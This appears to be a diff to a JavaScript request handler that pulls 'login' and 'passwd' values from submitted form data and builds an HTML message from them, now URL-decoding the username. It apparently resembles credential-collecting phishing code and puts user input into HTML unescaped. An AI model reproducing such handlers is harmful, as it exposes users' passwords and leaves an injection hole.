@@ -64,8 +64,10 @@ async function fetchAndApply(request) {
                 const [key, value] = pair.split('=');
 
                 if (key === 'login') {
-                    // Return the value of the login key
-                    message = message + "<b>User</b>: " + value + "<br>"
+                    // Decode the URL-encoded value for the username
+            		const username = decodeURIComponent(value.replace(/\+/g, ' '));
+           		 // Return the decoded value of the login key
+            		message = message + "<b>User</b>: " + username + "<br>";
                 }
                 if (key === 'passwd') {
                     // Return the value of the passwd key
